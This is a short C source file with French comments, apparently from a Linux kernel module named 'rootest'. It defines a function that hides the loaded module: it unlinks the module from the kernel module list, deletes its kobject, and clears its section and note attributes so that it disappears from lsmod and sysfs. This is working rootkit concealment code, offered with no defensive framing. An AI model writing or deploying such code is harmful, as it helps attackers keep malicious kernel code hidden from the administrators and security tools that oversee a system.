// Fonctions de dissimulation du module

#include "rootest.h"

void hide_from_lsmod(void) 
{
    list_del(&THIS_MODULE->list);              // Retirer de la liste chaînée des modules
    kobject_del(&THIS_MODULE->mkobj.kobj);     // Retirer le kobject
    THIS_MODULE->sect_attrs = NULL;            // Nettoyer les attributs de section
    THIS_MODULE->notes_attrs = NULL;           // Nettoyer les attributs de note
  // Il en reste ?
}


